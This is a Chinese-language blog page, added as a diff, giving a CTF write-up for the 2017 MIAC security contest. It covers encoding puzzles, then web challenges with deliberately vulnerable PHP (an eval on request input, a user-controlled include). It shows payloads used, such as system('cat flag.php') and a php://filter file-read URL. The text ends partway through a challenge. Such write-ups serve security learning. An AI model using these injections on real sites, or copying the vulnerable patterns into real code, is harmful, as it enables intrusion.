@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="┏ (゜ω゜)&#x3D;☞  滑稽树上滑稽果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017 MIAC移动安全赛">
+<meta property="og:url" content="https://findneo.github.io/171015MiacWP/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="┏ (゜ω゜)&#x3D;☞  滑稽树上滑稽果">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/web-checkin.png">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/cmd-inject.png">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/misc-checkin.png">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/cracked.png">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/normal-misc-flag.png">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/qpdecode.png">
+<meta property="og:image" content="https://findneo.github.io/171015MiacWP/jiuzaiyanqian-flag.png">
+<meta property="article:published_time" content="2017-10-15T08:25:04.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/171015MiacWP/web-checkin.png">
+
+<link rel="canonical" href="https://findneo.github.io/171015MiacWP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2017 MIAC移动安全赛 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/171015MiacWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2017 MIAC移动安全赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-10-15 16:25:04" itemprop="dateCreated datePublished" datetime="2017-10-15T16:25:04+08:00">2017-10-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+            <div class="post-description">┏ (゜ω゜)=☞  滑稽树上滑稽果</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="2017-10-14"><a href="#2017-10-14" class="headerlink" title="2017/10/14"></a>2017/10/14</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://miac.cug.edu.cn/">http://miac.cug.edu.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.yogeit.com/">http://www.yogeit.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bdctf.online/">https://www.bdctf.online/</a></p>
+</blockquote>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="贝斯的一家"><a href="#贝斯的一家" class="headerlink" title="贝斯的一家"></a>贝斯的一家</h4><blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>依次base64、base64、base32、base16解码。<br><code>flag&#123;fl4g_1_B4se_i3_V3ry_9ood&#125;</code></p>
+<h4 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h4><blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>aaencode ，<a target="_blank" rel="noopener" href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">在线解混淆</a> 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;flag&#123;aaencode_f14g_h4h4h4&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="你猜我像啥"><a href="#你猜我像啥" class="headerlink" title="你猜我像啥"></a>你猜我像啥</h4><blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=</span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">s=<span class="string">&#x27;Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=&#x27;</span></span><br><span class="line">b64decode(s.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))  </span><br><span class="line"><span class="comment">#&#x27;.---- ..--- ..... -....- ..... .---- -....- ----. ..... -....- .---- ----- .---- -....- ----. ..... -....- ....- ---.. -....- ----. ..... -....- .---- ----- .---- -....- .---- .---- --... -....- .---- .---- -.... -....- .---- ..--- .---- -....- .---- ----- ---.. -....- .---- ..--- ----- -....- .---- .---- ....- -....- .---- .---- ----- -....- .---- ----- ....- -....- .---- ----- ---.. -....- ..... .---- -....- ..... .---- -....- .---- ..--- ...-- -....- .---- .---- ----- -....- .---- .---- .....&#x27;</span></span><br><span class="line"><span class="comment">#摩斯密码的解密(https://morsecode.scphillips.com/translator.html)</span></span><br><span class="line"><span class="comment">#=&gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115</span></span><br><span class="line"><span class="comment">#ASCII码转字符	&#125;3_e_0_eutylxrnhl33&#123;ns</span></span><br><span class="line">t=<span class="string">&#x27;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115&#x27;</span></span><br><span class="line">tt=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="built_in">chr</span>(<span class="built_in">int</span>(x)),t.split(<span class="string">&#x27;-&#x27;</span>)))</span><br><span class="line"><span class="comment">#字符串反转  	sn&#123;33lhnrxlytue_0_e_3&#125;</span></span><br><span class="line">rtt=tt[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#栅栏密码的解密	synt&#123;u3e3_l0h_ner_x3l&#125;</span></span><br><span class="line"><span class="comment">#凯撒密码解密 	flag&#123;h3r3_y0u_are_k3y&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="2017-10-23"><a href="#2017-10-23" class="headerlink" title="2017/10/23"></a>2017/10/23</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB签到"><a href="#WEB签到" class="headerlink" title="WEB签到"></a>WEB签到</h4><blockquote>
+<p>签到，格式bdctf{xxxxx}<br><a target="_blank" rel="noopener" href="http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080/">http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;bdctf&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;pass can not be user.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>对数组进行哈希会返回null，所以传进去两个数组即可。<code>Flag: bdctf&#123;welcomeBDCTF2017&#125;</code></p>
+<p><img data-src="web-checkin.png"></p>
+<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><blockquote>
+<p>格式是flag{xxxx}<br><a target="_blank" rel="noopener" href="http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080/">http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接执行系统命令，<code>system(&#39;cat flag.php&#39;)</code> 。得到flag为<code>flag&#123;93odcGA47rSRFDG&#125;</code> </p>
+<p><img data-src="cmd-inject.png"></p>
+<h4 id="这不仅仅是WEB"><a href="#这不仅仅是WEB" class="headerlink" title="这不仅仅是WEB"></a>这不仅仅是WEB</h4><blockquote>
+<p>格式bdctf{xxxxx}<br><a target="_blank" rel="noopener" href="http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/">http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080</a></p>
+</blockquote>
+<p>存在文件读取：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;page&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$file</span> ) )</span><br><span class="line">	<span class="keyword">include</span>( <span class="variable">$file</span> );</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	header( <span class="string">&#x27;Location:?page=include.php&#x27;</span> );</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
